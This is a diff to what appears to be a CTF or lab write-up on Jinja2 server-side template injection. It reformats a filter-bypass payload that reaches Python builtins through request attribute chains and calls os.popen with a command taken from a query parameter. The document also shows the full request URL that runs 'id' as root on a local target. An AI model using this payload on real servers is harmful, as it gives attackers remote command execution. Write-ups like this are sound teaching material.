@@ -221,8 +221,9 @@ The idea was to use another input parameter to read the payload, this approach i
 
 And that’s the payload I came with
 
-```jinja2
-&#123;%with output=((((request|attr('application'))|attr(request|attr("args")|attr("get")('globals')))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('builtins'))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('import'))('os')|attr('popen')(request|attr("args")|attr("get")('cmd'))|attr('read')()%&#125;{%print(output)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=`
+```html
+&#123;%with output=((((request|attr('application'))|attr(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)(&#39;globals&#39;)))|attr(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)(&#39;getitem&#39;)))(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)(&#39;builtins&#39;))|attr(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)(&#39;getitem&#39;)))(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)(&#39;import&#39;)))(&#39;os&#39;)|attr(&#39;popen&#39;)(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)(&#39;cmd&#39;))|attr(&#39;read&#39;)()%&#125;&#123;%print(output)%&#125;&#123;%endwith%&#125;&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=
+
 ```
 
 To bypass the filter, I crafted a payload that cleverly navigates around the blacklisted characters
@@ -245,8 +246,8 @@ I navigated through the  `request`  attributes to access Python’s  `globals`  
 And Successfully executed the  `id`  command, confirming root access
 
 ```http
-http://0.0.0.0:3000/home?token=<>&directory=%&#123;with output=((((request|attr('application'))|attr(request|attr("args")|attr("get")('globals')))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('builtins'))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('import'))('os')|attr('popen')(request|attr("args")|attr("get")('cmd'))|attr('read')()%&#125;%&#123;print(output)%&#125;%&#123;
-endwith%&#125;&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=id
+http://0.0.0.0:3000/home?token=<>&directory=&#123;%with output=((((request|attr('application'))|attr(request|attr("args")|attr("get")('globals')))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('builtins'))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('import'))('os')|attr('popen')(request|attr("args")|attr("get")('cmd'))|attr('read')()%&#125;&#123;%print(output)%&#125;&#123;%endwith%&#125;&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=id
+
 ```
 
 
